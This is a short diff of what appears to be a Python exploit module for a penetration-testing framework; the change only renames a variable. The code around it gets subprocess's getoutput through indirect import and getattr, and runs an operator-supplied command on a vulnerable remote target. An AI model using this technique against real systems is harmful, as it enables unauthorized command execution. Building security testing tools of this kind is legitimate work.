@@ -85,11 +85,11 @@ def run(args):
         # Import the subprocess module and get a reference to it
         sp = imp('subprocess')
         # Get a reference to getoutput
-        system = _getattr(sp, 'getoutput')
+        remote_system = _getattr(sp, 'getoutput')
 
         # Execute remote command
         module.log("Executing command: {}".format(args['COMMAND']), 'success')
-        result = system(args['COMMAND'])
+        result = remote_system(args['COMMAND'])
         module.log("Command result: {}".format(result), 'success')
     except AttributeError:
         # If the target is not vulnerable, the above code will raise an AttributeError:
